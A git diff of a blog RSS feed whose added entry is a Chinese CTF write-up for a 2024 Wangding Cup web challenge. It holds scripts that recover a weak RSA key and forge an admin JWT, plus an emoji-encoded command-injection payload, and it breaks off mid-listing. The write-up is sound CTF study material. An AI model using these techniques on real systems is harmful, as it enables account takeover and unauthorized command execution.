@@ -1,4 +1,801 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on k1te's blog</title><link>https://k1te.cn/post/</link><description>Recent content in Posts on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 23 Oct 2024 13:34:53 +0800</lastBuildDate><atom:link href="https://k1te.cn/post/index.xml" rel="self" type="application/rss+xml"/><item><title>【论文阅读】IBA: Towards Irreversible Backdoor Attacks in Federated Learning</title><link>https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/</link><pubDate>Wed, 23 Oct 2024 13:34:53 +0800</pubDate><guid>https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/</guid><description>&lt;h3 id="info">Info
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on k1te's blog</title><link>https://k1te.cn/post/</link><description>Recent content in Posts on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 31 Oct 2024 12:12:36 +0800</lastBuildDate><atom:link href="https://k1te.cn/post/index.xml" rel="self" type="application/rss+xml"/><item><title>2024网鼎杯青龙组Web全WP</title><link>https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/</link><pubDate>Thu, 31 Oct 2024 12:12:36 +0800</pubDate><guid>https://k1te.cn/p/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84web%E5%85%A8wp/</guid><description>&lt;h3 id="web01">web01
+&lt;/h3>&lt;p>和广东省赛的hackme差不多，上回没做出来，这次可算出了。&lt;/p>
+&lt;p>首先通过爆破拿到了&lt;code>test:123456&lt;/code>账号，发现token是jwt，拿去解析发现算法是RS256，立马联想到之前做过的省赛，然后试了以下拿到了另一个账号&lt;code>test1:123456&lt;/code>。参考&lt;a class="link" href="https://ctftime.org/writeup/30541" target="_blank" rel="noopener"
+>CTFtime.org / DownUnderCTF 2021 (Online) / JWT / Writeup&lt;/a>，现在拿到两个jwt：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">test:&amp;#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">test1: &amp;#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>通过工具&lt;a class="link" href="https://github.com/FlorianPicca/JWT-Key-Recovery" target="_blank" rel="noopener"
+>FlorianPicca/JWT-Key-Recovery: A tool that recovers the public key used to sign JWT tokens&lt;/a>找公钥：&lt;/p>
+&lt;p>为了让我们能够攻击得到私钥，q设的特别小，因此需要使用&lt;code>-v&lt;/code>参数，将剔除掉的q拿到，他得到的n其实是p：&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/zk1te/img/main/image-20241101115039279.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>这里，p，q分别是&lt;code>178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071&lt;/code>，&lt;code>37&lt;/code>&lt;/p>
+&lt;p>利用脚本得到私钥（脚本来自qsdz）：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">rsa&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pathlib&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">admin_token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">test_token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">6587783811255857213423501659427445485733195847244841084416640087322920370505793710077653863560859194967014206895990092487007042261038365083278115634611522557149583345006263576760669731901928303983263803856696693078515488443260501485292429482201628351549976050972015840536205463606752217154446907981710898447627&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">q&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">37&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># p, q = q, p&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">65537&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">q&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">pow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">phi&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Path&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;public.pem&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rsa&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PublicKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save_pkcs1&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Path&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;private.pem&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rsa&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">PrivateKey&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">d&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">q&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">save_pkcs1&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>利用得到的公私钥生成admin的jwt：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">jwt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">test_jwt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">private_key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;-----BEGIN RSA PRIVATE KEY-----&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">MIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">ojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">u3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">AoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">TcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">URC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">SCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">S7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">uJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">bXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Hf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">tCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">qSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">jqta99E=&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">-----END RSA PRIVATE KEY-----&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">public_key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;-----BEGIN RSA PUBLIC KEY-----&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">MIGJAoGBJKVQx8LOD/KwbiLGiLo0oa5Y2e8illlNE1rTjl4fbHPNj9nJHAOiNK0w&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">fnDEbqc5W80Bj8RPHZc88LonUn/+fMLV8A0w0JhFrjvEhbRHBkENIAFwafC7dA/a&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">evsBHT+1mZIKWdx3ADtErOUkzwWztmZvnTZkxK/QDEyA3lQyH0ULAgMBAAE=&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">-----END RSA PUBLIC KEY-----&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">encoded&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s2">&amp;#34;username&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="n">private_key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">algorithm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;RS256&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">encoded&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>得到jwt token：&lt;code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1&lt;/code>&lt;/p>
+&lt;p>登录之后首先看game，发现非常抽象，通过fuzz知道emoji对应不同的字符，会将其作为命令执行，构造&lt;code>💿 🚩😜😐🐱 ⭐&lt;/code>，即&lt;code>CD flag;P:|cat *&lt;/code>的到源码:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;span class="lnt">159
+&lt;/span>&lt;span class="lnt">160
+&lt;/span>&lt;span class="lnt">161
+&lt;/span>&lt;span class="lnt">162
+&lt;/span>&lt;span class="lnt">163
+&lt;/span>&lt;span class="lnt">164
+&lt;/span>&lt;span class="lnt">165
+&lt;/span>&lt;span class="lnt">166
+&lt;/span>&lt;span class="lnt">167
+&lt;/span>&lt;span class="lnt">168
+&lt;/span>&lt;span class="lnt">169
+&lt;/span>&lt;span class="lnt">170
+&lt;/span>&lt;span class="lnt">171
+&lt;/span>&lt;span class="lnt">172
+&lt;/span>&lt;span class="lnt">173
+&lt;/span>&lt;span class="lnt">174
+&lt;/span>&lt;span class="lnt">175
+&lt;/span>&lt;span class="lnt">176
+&lt;/span>&lt;span class="lnt">177
+&lt;/span>&lt;span class="lnt">178
+&lt;/span>&lt;span class="lnt">179
+&lt;/span>&lt;span class="lnt">180
+&lt;/span>&lt;span class="lnt">181
+&lt;/span>&lt;span class="lnt">182
+&lt;/span>&lt;span class="lnt">183
+&lt;/span>&lt;span class="lnt">184
+&lt;/span>&lt;span class="lnt">185
+&lt;/span>&lt;span class="lnt">186
+&lt;/span>&lt;span class="lnt">187
+&lt;/span>&lt;span class="lnt">188
+&lt;/span>&lt;span class="lnt">189
+&lt;/span>&lt;span class="lnt">190
+&lt;/span>&lt;span class="lnt">191
+&lt;/span>&lt;span class="lnt">192
+&lt;/span>&lt;span class="lnt">193
+&lt;/span>&lt;span class="lnt">194
+&lt;/span>&lt;span class="lnt">195
+&lt;/span>&lt;span class="lnt">196
+&lt;/span>&lt;span class="lnt">197
+&lt;/span>&lt;span class="lnt">198
+&lt;/span>&lt;span class="lnt">199
+&lt;/span>&lt;span class="lnt">200
+&lt;/span>&lt;span class="lnt">201
+&lt;/span>&lt;span class="lnt">202
+&lt;/span>&lt;span class="lnt">203
+&lt;/span>&lt;span class="lnt">204
+&lt;/span>&lt;span class="lnt">205
+&lt;/span>&lt;span class="lnt">206
+&lt;/span>&lt;span class="lnt">207
+&lt;/span>&lt;span class="lnt">208
+&lt;/span>&lt;span class="lnt">209
+&lt;/span>&lt;span class="lnt">210
+&lt;/span>&lt;span class="lnt">211
+&lt;/span>&lt;span class="lnt">212
+&lt;/span>&lt;span class="lnt">213
+&lt;/span>&lt;span class="lnt">214
+&lt;/span>&lt;span class="lnt">215
+&lt;/span>&lt;span class="lnt">216
+&lt;/span>&lt;span class="lnt">217
+&lt;/span>&lt;span class="lnt">218
+&lt;/span>&lt;span class="lnt">219
+&lt;/span>&lt;span class="lnt">220
+&lt;/span>&lt;span class="lnt">221
+&lt;/span>&lt;span class="lnt">222
+&lt;/span>&lt;span class="lnt">223
+&lt;/span>&lt;span class="lnt">224
+&lt;/span>&lt;span class="lnt">225
+&lt;/span>&lt;span class="lnt">226
+&lt;/span>&lt;span class="lnt">227
+&lt;/span>&lt;span class="lnt">228
+&lt;/span>&lt;span class="lnt">229
+&lt;/span>&lt;span class="lnt">230
+&lt;/span>&lt;span class="lnt">231
+&lt;/span>&lt;span class="lnt">232
+&lt;/span>&lt;span class="lnt">233
+&lt;/span>&lt;span class="lnt">234
+&lt;/span>&lt;span class="lnt">235
+&lt;/span>&lt;span class="lnt">236
+&lt;/span>&lt;span class="lnt">237
+&lt;/span>&lt;span class="lnt">238
+&lt;/span>&lt;span class="lnt">239
+&lt;/span>&lt;span class="lnt">240
+&lt;/span>&lt;span class="lnt">241
+&lt;/span>&lt;span class="lnt">242
+&lt;/span>&lt;span class="lnt">243
+&lt;/span>&lt;span class="lnt">244
+&lt;/span>&lt;span class="lnt">245
+&lt;/span>&lt;span class="lnt">246
+&lt;/span>&lt;span class="lnt">247
+&lt;/span>&lt;span class="lnt">248
+&lt;/span>&lt;span class="lnt">249
